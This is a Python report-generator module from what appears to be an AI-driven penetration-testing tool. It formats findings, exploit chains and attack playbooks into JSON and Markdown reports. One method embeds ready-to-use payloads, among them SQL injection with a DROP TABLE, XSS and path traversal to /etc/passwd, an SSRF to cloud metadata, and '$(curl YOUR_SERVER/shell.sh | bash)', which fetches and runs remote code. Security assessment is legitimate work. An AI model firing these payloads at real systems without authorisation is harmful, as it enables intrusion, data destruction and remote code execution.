"""
reports/report_generator.py - Report Generator
Generates comprehensive security assessment reports
"""

import json
import os
import logging
from typing import Dict, Any, List
from datetime import datetime

logger = logging.getLogger("recon.report_generator")


class ReportGenerator:
    """
    Generates comprehensive security assessment reports in multiple formats:
    - JSON: Structured data for programmatic access
    - Markdown: Human-readable executive summary
    - HTML: Interactive web report (future)
    """

    def __init__(self, state, output_dir: str):
        self.state = state
        self.output_dir = output_dir
        self.report_file = os.path.join(output_dir, "final_report.md")
        self.json_file = os.path.join(output_dir, "final_report.json")

    def generate(self):
        """Generate all report formats"""
        logger.info("[REPORT] Generating final security assessment report")

        # Generate JSON report
        self._generate_json_report()

        # Generate Markdown report
        self._generate_markdown_report()

        logger.info(f"[REPORT] Reports saved to {self.output_dir}")

    def _generate_json_report(self):
        """Generate structured JSON report"""
        # FILTER: Only include high-confidence vulnerabilities
        all_vulns = self.state.get("vulnerabilities", [])
        valid_vulns = [v for v in all_vulns if self._confidence_sort_value(v.get('confidence', 0)) >= 0.5]
        
        logger.info(f"[REPORT] Filtering: {len(all_vulns)} → {len(valid_vulns)} valid vulns")
        
        # Build summary with FILTERED vulns
        summary = self._build_summary()
        summary["vulnerabilities_found"] = len(valid_vulns)  # Override with filtered count
        
        report_data = {
            "assessment_info": {
                "target": self.state.get("target", ""),
                "start_time": self.state.get("start_time", ""),
                "end_time": datetime.now().isoformat(),
                "duration": self._calculate_duration(),
                "agent_version": "1.0.0"
            },
            "summary": summary,
            "findings": {
                "subdomains": self.state.get("subdomains", []),
                "live_hosts": self.state.get("live_hosts", []),
                "endpoints": self.state.get("prioritized_endpoints", []),
                "vulnerabilities": valid_vulns,
                "exploit_chains": self._format_chains_for_json(),
                "external_findings": self.state.get("external_findings", []),
                "security_findings": self.state.get("security_findings", []),
                "rce_chain_possibilities": self.state.get("rce_chain_possibilities", [])
            },
            "attack_surface": {
                "total_endpoints": len(self.state.get("endpoints", [])),
                "prioritized_endpoints": len(self.state.get("prioritized_endpoints", [])),
                "vulnerable_endpoints": len(valid_vulns),
                "attack_chains": len(self.state.get("exploit_chains", []))
            },
            "technical_details": {
                "scan_responses": len(self.state.get("scan_responses", [])),
                "iterations_performed": getattr(self.state, 'iteration_count', 1),
                "learning_data": self._get_learning_summary(),
                "manual_validation": {
                    "pending": self.state.get("manual_validation_required", []),
                    "completed": self.state.get("manual_validation_completed", [])
                },
                "manual_attack_playbook": self.state.get("manual_attack_playbook", []),
                "wordpress_advanced_scan": self.state.get("technical_details", {}).get("wordpress_advanced_scan", {})
            }
        }

        with open(self.json_file, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)

    def _generate_markdown_report(self):
        """Generate human-readable Markdown report"""
        lines = []

        # Header
        lines.extend([
            "# 🔒 AUTONOMOUS SECURITY ASSESSMENT REPORT",
            "",
            f"**Target:** {self.state.get('target', 'Unknown')}",
            f"**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"**Duration:** {self._calculate_duration()}",
            "",
            "---",
            ""
        ])

        # Executive Summary
        lines.extend(self._build_executive_summary())
        lines.append("")

        # Attack Surface Overview
        lines.extend(self._build_attack_surface_section())
        lines.append("")

        # External toolkit findings
        lines.extend(self._build_external_findings_section())
        lines.append("")


        # 🔥 THÊM: Security Findings (non-CVE)
        lines.extend(self._build_security_findings_section())
        lines.append("")

        # 🔥 THÊM: RCE Chain Possibilities
        lines.extend(self._build_rce_chain_section())
        lines.append("")


        # Critical Findings
        lines.extend(self._build_findings_section())
        lines.append("")

        # High-Potential Findings (NEW - prioritized for manual testing)
        lines.extend(self._build_high_potential_findings_section())
        lines.append("")

        # Manual validation queue
        lines.extend(self._build_manual_validation_section())
        lines.append("")

        # Exploit Chains
        lines.extend(self._build_chains_section())
        lines.append("")

        # Manual exploit playbook (ENHANCED - with step-by-step instructions)
        lines.extend(self._build_manual_exploit_playbook_section())
        lines.append("")

        # Manual playbook (legacy)
        lines.extend(self._build_manual_playbook_section())
        lines.append("")

        # Recommendations
        lines.extend(self._build_recommendations_section())
        lines.append("")

        # Technical Details
        lines.extend(self._build_technical_details_section())

        # Write to file
        with open(self.report_file, 'w') as f:
            f.write('\n'.join(lines))

    def _build_summary(self) -> Dict[str, Any]:
        """Build summary statistics"""
        vulns = self.state.get("confirmed_vulnerabilities", [])
        chains = self.state.get("exploit_chains", [])
        endpoints = self.state.get("prioritized_endpoints", [])
        all_vulns = self.state.get("vulnerabilities", []) or []
        merged_vulns = []
        seen = set()
        for vuln in (vulns or []) + all_vulns:
            key = (
                vuln.get("url") or vuln.get("endpoint"),
                vuln.get("type"),
                vuln.get("payload"),
                vuln.get("source"),
            )
            if key in seen:
                continue
            seen.add(key)
            merged_vulns.append(vuln)

        return {
            "subdomains_discovered": len(self.state.get("subdomains", [])),
            "live_hosts_found": len(self.state.get("live_hosts", [])),
            "endpoints_analyzed": len(endpoints),
            "vulnerabilities_found": len(merged_vulns),
            "exploit_chains_planned": len(chains),
            "critical_vulns": len([v for v in vulns if v.get("severity") == "CRITICAL"]),
            "high_vulns": len([v for v in vulns if v.get("severity") == "HIGH"]),
            "successful_exploits": len(self._meaningful_successful_exploits())
        }

    def _meaningful_successful_exploits(self) -> List[Dict[str, Any]]:
        exploit_results = self.state.get("exploit_results", []) or []

        def is_meaningful(result):
            if not result.get("success"):
                return False
            context = result.get("context", {}) or {}
            chain_name = (result.get("chain") or "").lower()
            if "xml-rpc multicall bruteforce" in chain_name:
                return bool(context.get("valid_credentials"))
            if "wordpress admin takeover" in chain_name:
                return bool(context.get("authenticated_session") and context.get("admin_access"))
            if "sql injection" in chain_name:
                return bool(context.get("sqli_confirmed") and (context.get("database_list") or context.get("dumped_credentials")))
            if "upload" in chain_name and "rce" in chain_name:
                return bool(context.get("uploaded_shell_url") and context.get("rce_verified"))
            return bool(result.get("final_payload"))

        return [r for r in exploit_results if is_meaningful(r)]

    def _build_executive_summary(self) -> List[str]:
        """Build executive summary section"""
        summary = self._build_summary()

        lines = [
            "## 📊 EXECUTIVE SUMMARY",
            "",
            "| Metric | Count |",
            "|--------|-------|",
            f"| Subdomains Discovered | {summary['subdomains_discovered']} |",
            f"| Live Hosts Found | {summary['live_hosts_found']} |",
            f"| Endpoints Analyzed | {summary['endpoints_analyzed']} |",
            f"| Vulnerabilities Found | {summary['vulnerabilities_found']} |",
            f"| Exploit Chains Planned | {summary['exploit_chains_planned']} |",
            f"| Successful Exploits | {summary['successful_exploits']} |",
            "",
            "### Risk Assessment",
            "",
            f"- **Critical Vulnerabilities:** {summary['critical_vulns']}",
            f"- **High-Risk Vulnerabilities:** {summary['high_vulns']}",
            f"- **Attack Vectors Identified:** {summary['exploit_chains_planned']}",
            "",
            f"**Overall Risk Level:** {self._calculate_risk_level(summary)}",
            ""
        ]

        return lines

    def _build_attack_surface_section(self) -> List[str]:
        """Build attack surface overview"""
        lines = [
            "## 🎯 ATTACK SURFACE OVERVIEW",
            "",
            "### Discovered Assets",
        ]

        subdomains = self.state.get("subdomains", [])
        if subdomains:
            lines.append("**Subdomains:**")
            for sub in subdomains[:10]:  # Show first 10
                lines.append(f"- {sub}")
            if len(subdomains) > 10:
                lines.append(f"- ... and {len(subdomains) - 10} more")
            lines.append("")

        live_hosts = self.state.get("live_hosts", [])
        if live_hosts:
            lines.append("**Live Hosts:**")
            for host in live_hosts[:10]:
                url = host.get("url", "")
                status = host.get("status_code", "")
                lines.append(f"- {url} (Status: {status})")
            lines.append("")

        # Include non-CVE findings and RCE chain possibilities directly here as well,
        # so report users can see them even if other sections are suppressed.
        security_findings = self.state.get("security_findings", []) or []
        rce_chains = self.state.get("rce_chain_possibilities", []) or []

        lines.append("### Security Findings (Non-CVE)")
        if security_findings:
            for idx, f in enumerate(security_findings, 1):
                title = f.get("title", f.get("type", "Unknown"))
                endpoint = f.get("endpoint", "")
                evidence = (f.get("evidence", "") or "").strip()
                severity = f.get("severity", "INFO")
                lines.extend([
                    f"**{idx}. {title}**",
                    f"- **Severity:** {severity}",
                    f"- **Endpoint:** {endpoint}",
                    f"- **Evidence:** {evidence[:2000]}",
                    "",
                ])
        else:
            lines.append("No security findings detected.")
            lines.append("")

        lines.append("### RCE Chain Possibilities")
        if rce_chains:
            for idx, c in enumerate(rce_chains, 1):
                title = c.get("title", "Unknown RCE Chain")
                severity = c.get("severity", "MEDIUM")
                components = c.get("components", []) or []
                evidence = (c.get("evidence", "") or "").strip()
                requires_validation = c.get("requires_validation", True)
                lines.extend([
                    f"**{idx}. {title}**",
                    f"- **Severity:** {severity}",
                    f"- **Requires Validation:** {'Yes' if requires_validation else 'No'}",
                    f"- **Components:** {', '.join([str(x) for x in components])}",
                    f"- **Evidence:** {evidence[:2000]}",
                    "",
                ])
        else:
            lines.append("No RCE chain possibilities identified.")
            lines.append("")

        return lines

    def _build_findings_section(self) -> List[str]:
        """Build critical findings section"""
        lines = [
            "## 🚨 CRITICAL FINDINGS",
            ""
        ]

        vulns = self.state.get("confirmed_vulnerabilities", [])
        if not vulns:
            lines.append("No critical vulnerabilities found.")
            return lines

        for i, vuln in enumerate(vulns, 1):
            manual_flag = "Yes" if vuln.get("requires_manual_validation") else "No"
            lines.extend([
                f"### {i}. {vuln.get('name', 'Unknown Vulnerability')}",
                "",
                f"- **Endpoint:** {vuln.get('endpoint', '')}",
                f"- **Type:** {vuln.get('type', '')}",
                f"- **Severity:** {vuln.get('severity', 'MEDIUM')}",
                f"- **Confidence:** {self._format_confidence(vuln.get('confidence', 0))}",
                f"- **Manual Validation Required:** {manual_flag}",
                ""
            ])

        return lines

    def _build_high_potential_findings_section(self) -> List[str]:
        """Build section for high-potential findings that need manual verification"""
        lines = ["## 🎯 HIGH-POTENTIAL FINDINGS", "", "*These findings have high exploit potential but require manual verification. Prioritize these for manual testing.*", ""]
        high_potential = []
        vulns = self.state.get("vulnerabilities", [])
        for v in vulns:
            if self._confidence_sort_value(v.get("confidence", 0)) >= 0.7 and not v.get("confirmed", False):
                high_potential.append({"source": "vulnerability_scan", "name": v.get("name", "Unknown"), "endpoint": v.get("endpoint", ""), "type": v.get("type", ""), "severity": v.get("severity", "MEDIUM"), "confidence": v.get("confidence", 0), "evidence": v.get("evidence", ""), "manual_steps": v.get("manual_verification_steps", [])})
        rce_chains = self.state.get("rce_chain_possibilities", [])
        for c in rce_chains:
            if c.get("severity") in ["CRITICAL", "HIGH"]:
                high_potential.append({"source": "rce_chain", "name": c.get("title", "RCE Chain"), "endpoint": c.get("endpoint", ""), "type": "RCE Chain", "severity": c.get("severity", "HIGH"), "confidence": 0.6, "evidence": c.get("evidence", ""), "components": c.get("components", []), "manual_steps": c.get("manual_verification_steps", [])})
        security_findings = self.state.get("security_findings", [])
        for f in security_findings:
            if f.get("severity") in ["CRITICAL", "HIGH"] and f.get("requires_validation", True):
                high_potential.append({"source": "security_finding", "name": f.get("title", f.get("type", "Unknown")), "endpoint": f.get("endpoint", ""), "type": f.get("type", ""), "severity": f.get("severity", "HIGH"), "confidence": 0.5, "evidence": f.get("evidence", ""), "manual_steps": f.get("manual_verification_steps", [])})
        if not high_potential:
            lines.append("No high-potential findings requiring manual verification.")
            return lines
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        high_potential.sort(key=lambda x: (severity_order.get(x["severity"], 2), -self._confidence_sort_value(x.get("confidence", 0))))
        lines.append(f"**Total High-Potential Findings:** {len(high_potential)}")
        lines.append("")
        for severity in ["CRITICAL", "HIGH", "MEDIUM"]:
            items = [i for i in high_potential if i["severity"] == severity]
            if not items:
                continue
            lines.append(f"### {severity} Severity ({len(items)} findings)")
            lines.append("")
            for idx, item in enumerate(items[:10], 1):
                lines.extend([f"**{idx}. {item['name']}**", "", f"- **Source:** {item['source']}", f"- **Endpoint:** `{item['endpoint']}`", f"- **Type:** {item['type']}", f"- **Confidence:** {self._format_confidence(item.get('confidence', 0))}", ""])
                evidence = item.get("evidence", "")
                if evidence:
                    lines.extend(["**Evidence:**", "```text", evidence[:500], "```", ""])
                manual_steps = item.get("manual_steps", [])
                if manual_steps:
                    lines.append("**Manual Verification Steps:**")
                    for step in manual_steps[:5]:
                        lines.append(f"  - {step}")
                    lines.append("")
                exploit_suggestion = self._generate_exploit_suggestion(item)
                if exploit_suggestion:
                    lines.extend(["**💡 Exploit Suggestion:**", f"  {exploit_suggestion}", ""])
            lines.append("")
        return lines

    def _generate_exploit_suggestion(self, finding: Dict) -> str:
        """Generate manual exploit suggestion based on finding type"""
        finding_type = finding.get("type", "").lower()
        name = finding.get("name", "").lower()
        endpoint = finding.get("endpoint", "")
        suggestions = []
        if any(kw in finding_type or kw in name for kw in ["sql", "sqli", "injection"]):
            suggestions.append("Try: `' OR 1=1--`, `1; DROP TABLE users--`, `UNION SELECT NULL,NULL,NULL`")
            suggestions.append(f"Use sqlmap: `sqlmap -u '{endpoint}' --dbs`")
        elif any(kw in finding_type or kw in name for kw in ["xss", "script"]):
            suggestions.append("Try: `<script>alert(1)</script>`, `\"><img src=x onerror=alert(1)>`")
            suggestions.append("Test for stored vs reflected XSS by checking persistence")
        elif any(kw in name for kw in ["rce", "remote code", "command injection"]):
            suggestions.append("Try: `; id`, `| whoami`, `$(curl YOUR_SERVER/shell.sh | bash)`")
            suggestions.append("Test blind RCE with out-of-band techniques (DNS/HTTP callbacks)")
        elif any(kw in finding_type or kw in name for kw in ["lfi", "rfi", "file inclusion"]):
            suggestions.append("Try: `../../../etc/passwd`, `php://filter/convert.base64-encode/resource=index.php`")
            suggestions.append("Check for log poisoning or /proc/self/environ exposure")
        elif any(kw in finding_type or kw in name for kw in ["ssrf"]):
            suggestions.append("Try: `http://169.254.169.254/latest/meta-data/`, `file:///etc/passwd`")
            suggestions.append("Test internal network scanning via DNS callbacks")
        elif any(kw in finding_type or kw in name for kw in ["idor", "authorization", "access control"]):
            suggestions.append("Try incrementing/decrementing IDs, test with different user sessions")
            suggestions.append("Check for UUID prediction or enumeration vulnerabilities")
        elif any(kw in name for kw in ["auth", "bypass", "login"]):
            suggestions.append("Try default credentials, SQL injection in login, JWT manipulation")
            suggestions.append("Test for race conditions in authentication flow")
        elif any(kw in finding_type or kw in name for kw in ["traversal", "path"]):
            suggestions.append("Try: `../../../`, `..%2f..%2f`, `....//....//`")
            suggestions.append("Test URL-encoded and double-encoded variants")
        elif any(kw in finding_type or kw in name for kw in ["xxe", "xml"]):
            suggestions.append("Try: XXE payload with external DTD")
            suggestions.append("Test out-of-band XXE techniques")
        elif any(kw in finding_type or kw in name for kw in ["deserial", "serialization"]):
            suggestions.append("Try Java/PHP/Python deserialization payloads (ysoserial, phpggc)")
            suggestions.append("Test with OOB techniques for blind exploitation")
        else:
            suggestions.append("Review the evidence carefully and test common payloads for the vulnerability type")
            suggestions.append("Consider using Burp Suite or OWASP ZAP for manual testing")
        return " | ".join(suggestions)

    def _build_manual_exploit_playbook_section(self) -> List[str]:
        """Build detailed manual exploit playbook with step-by-step instructions"""
        lines = ["## 📋 MANUAL EXPLOIT PLAYBOOK", "", "*Step-by-step exploitation guide for high-value targets.*", ""]
        playbooks = self.state.get("manual_attack_playbook", [])
        if not playbooks:
            lines.append("No manual exploit playbooks generated.")
            return lines
        for idx, playbook in enumerate(playbooks[:5], 1):
            lines.extend([f"### Playbook {idx}: {playbook.get('name', 'Unnamed Chain')}", "", f"- **Goal:** {playbook.get('goal', 'Achieve exploitation objective')}", f"- **Risk Level:** {playbook.get('risk_level', 'MEDIUM')}", f"- **Estimated Time:** {playbook.get('estimated_time', '30 minutes')}", "", "**Prerequisites:**"])
            prerequisites = playbook.get("prerequisites", [])
            if prerequisites:
                for prereq in prerequisites:
                    lines.append(f"- {prereq}")
            else:
                lines.extend(["- Valid target endpoint", "- Network access to target"])
            lines.extend(["", "**Step-by-Step Exploitation:**", ""])
            steps = playbook.get("steps", [])
            for step_idx, step in enumerate(steps[:10], 1):
                step_title = step.get("title", f"Step {step_idx}")
                step_tool = step.get("tool", "manual")
                step_target = step.get("target", "")
                step_desc = step.get("description", "")
                lines.extend([f"**Step {step_idx}: {step_title}**"])
                if step_desc:
                    lines.append(f"  - Description: {step_desc}")
                lines.extend([f"  - Tool: {step_tool}", f"  - Target: `{step_target}`"])
                command = step.get("command", "")
                if command:
                    lines.append(f"  - Command: ```{command}```")
                expected = step.get("expected_result", "")
                if expected:
                    lines.append(f"  - Expected: {expected}")
                lines.append("")
            lines.extend(["**Post-Exploitation:**", "- Document all findings with screenshots", "- Clean up any test data created during exploitation", "- Report findings to the development team", ""])
        return lines

    def _build_manual_validation_section(self) -> List[str]:
        """Build section for findings that require manual validation."""
        lines = [
            "## ✅ MANUAL VALIDATION STATUS",
            ""
        ]
        pending = self.state.get("manual_validation_required", [])
        completed = self.state.get("manual_validation_completed", [])

        if not pending and not completed:
            lines.append("No manual validation items were generated.")
            return lines

        lines.append(f"- Pending manual review: {len(pending)}")
        lines.append(f"- Completed manual reviews: {len(completed)}")
        lines.append("")
        if pending:
            lines.append("### Pending Items")
            for item in pending[:20]:
                lines.append(
                    f"- [{item.get('severity', 'MEDIUM')}] {item.get('type', 'unknown')} at {item.get('endpoint', '')}"
                )
            lines.append("")
        return lines

    def _build_chains_section(self) -> List[str]:
        """Build exploit chains section"""
        lines = [
            "## ⛓️ EXPLOIT CHAINS",
            ""
        ]

        chains = self.state.get("exploit_chains", [])
        if not chains:
            lines.append("No exploit chains identified.")
            return lines

        for i, chain in enumerate(chains[:5], 1):  # Show top 5
            lines.extend([
                f"### Chain {i}: {chain.get('name', 'Unknown')}",
                "",
                f"- **Risk Level:** {chain.get('risk_level', 'MEDIUM')}",
                f"- **Steps:** {len(chain.get('steps', []))}",
                f"- **Description:** {chain.get('description', '')}",
                ""
            ])

        return lines

    def _build_recommendations_section(self) -> List[str]:
        """Build recommendations section"""
        lines = [
            "## 💡 RECOMMENDATIONS",
            "",
            "### Immediate Actions",
            "- Patch all critical and high-severity vulnerabilities",
            "- Implement Web Application Firewall (WAF) rules",
            "- Review and harden authentication mechanisms",
            "- Update all third-party components and plugins",
            "",
            "### Long-term Security Improvements",
            "- Implement regular security assessments",
            "- Deploy intrusion detection/prevention systems",
            "- Establish secure development lifecycle (SDL)",
            "- Conduct security awareness training",
            ""
        ]

        return lines

    def _build_manual_playbook_section(self) -> List[str]:
        """Build manually executable chain playbook section."""
        lines = [
            "## 🧭 MANUAL ATTACK PLAYBOOK",
            ""
        ]
        playbook = self.state.get("manual_attack_playbook", [])
        if not playbook:
            lines.append("No manual playbook generated.")
            return lines

        lines.append(f"- Playbook chains: {len(playbook)}")
        lines.append("")
        for chain in playbook[:5]:
            lines.append(f"### {chain.get('id', 'CHAIN')} - {chain.get('name', 'Unnamed Chain')}")
            lines.append(f"- Risk: {chain.get('risk_level', 'MEDIUM')}")
            lines.append(f"- Goal: {chain.get('goal', '')}")
            lines.append(f"- Estimated Time: {chain.get('estimated_time', 'unknown')}")
            lines.append("- Steps:")
            for step in chain.get("steps", [])[:10]:
                lines.append(
                    f"  - [{step.get('step', '?')}] {step.get('title', 'step')} | tool={step.get('tool', 'manual')} | target={step.get('target', '')}"
                )
            lines.append("")
        return lines

    def _build_external_findings_section(self) -> List[str]:
        """Build section for external-tool findings."""
        lines = [
            "## 🛠️ EXTERNAL TOOLKIT FINDINGS",
            ""
        ]
        findings = self.state.get("external_findings", [])
        if not findings:
            lines.append("No external-tool findings recorded.")
            return lines
        lines.append(f"- Total findings: {len(findings)}")
        by_tool: Dict[str, int] = {}
        for finding in findings:
            tool = finding.get("tool", "unknown")
            by_tool[tool] = by_tool.get(tool, 0) + 1
        for tool, count in sorted(by_tool.items(), key=lambda x: x[0]):
            lines.append(f"- {tool}: {count}")
        lines.append("")
        for item in findings[:15]:
            lines.append(f"### {item.get('tool', 'tool')} @ {item.get('url', '')}")
            lines.append(f"- Severity: {item.get('severity', 'INFO')}")
            lines.append("```text")
            lines.append((item.get("output", "") or "").strip()[:1200])
            lines.append("```")
            lines.append("")
        return lines



    def _build_security_findings_section(self) -> List[str]:
        """Build section for security findings (non-CVE)"""
        lines = [
            "## 📋 SECURITY FINDINGS (Non-CVE)",
            "",
            "*These are security observations, misconfigurations, and informational findings that may not have CVEs but indicate security posture issues.*",
            ""
        ]
        
        findings = self.state.get("security_findings", [])
        if not findings:
            lines.append("No security findings detected.")
            return lines
        
        # Group by severity
        by_severity = {"CRITICAL": [], "HIGH": [], "MEDIUM": [], "LOW": [], "INFO": []}
        for f in findings:
            severity = f.get("severity", "INFO")
            if severity in by_severity:
                by_severity[severity].append(f)
            else:
                by_severity["INFO"].append(f)
        
        # Count by severity
        lines.append("| Severity | Count |")
        lines.append("|----------|-------|")
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            if by_severity[sev]:
                lines.append(f"| {sev} | {len(by_severity[sev])} |")
        lines.append("")
        
        # List findings by severity
        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            if not by_severity[sev]:
                continue
            lines.append(f"### {sev} Severity Findings")
            lines.append("")
            for i, finding in enumerate(by_severity[sev], 1):
                title = finding.get("title", finding.get("type", "Unknown"))
                endpoint = finding.get("endpoint", "")
                evidence = finding.get("evidence", "")[:200]
                lines.extend([
                    f"**{i}. {title}**",
                    f"- **Endpoint:** {endpoint}",
                    f"- **Evidence:** {evidence}",
                    ""
                ])
            lines.append("")
        
        return lines



    def _build_rce_chain_section(self) -> List[str]:
        """Build section for RCE chain possibilities"""
        lines = [
            "## 💣 RCE CHAIN POSSIBILITIES",
            "",
            "*These are potential Remote Code Execution attack chains identified from the attack surface.*",
            ""
        ]
        
        rce_chains = self.state.get("rce_chain_possibilities", [])
        if not rce_chains:
            lines.append("No RCE chain possibilities identified.")
            return lines
        
        lines.append("| Chain | Severity | Components | Requires Validation |")
        lines.append("|-------|----------|------------|---------------------|")
        
        for chain in rce_chains:
            title = chain.get("title", "Unknown RCE Chain")[:40]
            severity = chain.get("severity", "MEDIUM")
            components = ", ".join(chain.get("components", [])[:2])
            requires_val = "Yes" if chain.get("requires_validation", True) else "No"
            lines.append(f"| {title} | {severity} | {components} | {requires_val} |")
        
        lines.append("")
        lines.append("### Detailed RCE Chains")
        lines.append("")
        
        for i, chain in enumerate(rce_chains, 1):
            lines.extend([
                f"**{i}. {chain.get('title', 'Unknown RCE Chain')}**",
                f"- **Severity:** {chain.get('severity', 'MEDIUM')}",
                f"- **Components:** {', '.join(chain.get('components', []))}",
                f"- **Evidence:** {chain.get('evidence', '')[:200]}",
                f"- **Requires Manual Validation:** {chain.get('requires_validation', True)}",
                ""
            ])
        
        return lines




    def _build_technical_details_section(self) -> List[str]:
        """Build technical details section"""
        lines = [
            "## 🔧 TECHNICAL DETAILS",
            "",
            "### Scan Configuration",
            f"- Iterations Performed: {getattr(self.state, 'iteration_count', 1)}",
            f"- AI Model Used: Groq LLaMA 3.3 70B",
            f"- Payload Mutations Applied: {len(self.state.get('scan_responses', []))}",
            "",
            "### Learning Engine Stats",
        ]

        learning = self._get_learning_summary()
        lines.extend([
            f"- Successful Payloads Learned: {learning.get('successful', 0)}",
            f"- Failed Payloads Analyzed: {learning.get('failed', 0)}",
            f"- Mutation Suggestions: {len(learning.get('suggestions', []))}",
            ""
        ])

        return lines

    def _calculate_duration(self) -> str:
        """Calculate scan duration"""
        start = self.state.get("start_time")
        if start:
            try:
                start_dt = datetime.fromisoformat(start)
                duration = datetime.now() - start_dt
                return f"{duration.seconds // 3600}h {(duration.seconds % 3600) // 60}m {duration.seconds % 60}s"
            except:
                pass
        return "Unknown"

    def _calculate_risk_level(self, summary: Dict[str, Any]) -> str:
        """Calculate overall risk level"""
        critical = summary.get('critical_vulns', 0)
        high = summary.get('high_vulns', 0)
        chains = summary.get('exploit_chains_planned', 0)
        pending_manual = self.state.get("manual_validation_required", [])
        pending_critical = any(item.get("severity") == "CRITICAL" for item in pending_manual)
        
        # 🔥 THÊM: RCE chains detection
        rce_chains = self.state.get("rce_chain_possibilities", [])
        high_rce_chains = len([c for c in rce_chains if c.get("severity") == "HIGH"])
        med_rce_chains = len([c for c in rce_chains if c.get("severity") == "MEDIUM"])
        
        if pending_critical:
            return "CRITICAL (PENDING MANUAL VALIDATION)"

        if critical > 0 or chains > 3 or high_rce_chains > 0:
            return "CRITICAL"
        elif high > 2 or chains > 1 or med_rce_chains > 2:
            return "HIGH"
        elif high > 0 or chains > 0 or rce_chains:
            return "MEDIUM"
        else:
            return "LOW"

    def _format_chains_for_json(self) -> List[Dict[str, Any]]:
        """Format chains for JSON export"""
        chains = self.state.get("exploit_chains", [])
        return [
            {
                "name": chain.get("name", ""),
                "risk_level": chain.get("risk_level", ""),
                "steps": len(chain.get("steps", [])),
                "description": chain.get("description", "")
            }
            for chain in chains
        ]

    def _get_learning_summary(self) -> Dict[str, Any]:
        """Get learning engine summary"""
        try:
            from learning.learning_engine import LearningEngine
            learner = LearningEngine(self.output_dir)
            return {
                "successful": len(learner.successful_payloads),
                "failed": len(learner.failed_payloads),
                "suggestions": learner.suggest_mutations()
            }
        except:
            return {"successful": 0, "failed": 0, "suggestions": []}

    def _format_confidence(self, value) -> str:
        """Safely format confidence value as percentage, handling both float and string types."""
        try:
            # If it's already a number (float/int), format as percentage
            if isinstance(value, (int, float)):
                return f"{value:.2%}" if value <= 1.0 else f"{value:.1f}%"
            # If it's a string, try to convert to float first
            elif isinstance(value, str):
                # Handle percentage strings like "85%" or "0.85"
                if value.endswith('%'):
                    return value
                num = float(value)
                return f"{num:.2%}" if num <= 1.0 else f"{num:.1f}%"
            else:
                return str(value)
        except (ValueError, TypeError):
            return str(value)

    def _confidence_sort_value(self, value) -> float:
        """Normalize confidence into a numeric value safe for sorting."""
        try:
            if isinstance(value, str):
                cleaned = value.strip()
                if cleaned.endswith('%'):
                    return float(cleaned[:-1]) / 100.0
                return float(cleaned)
            if isinstance(value, (int, float)):
                return float(value)
        except (ValueError, TypeError):
            pass
        return 0.0
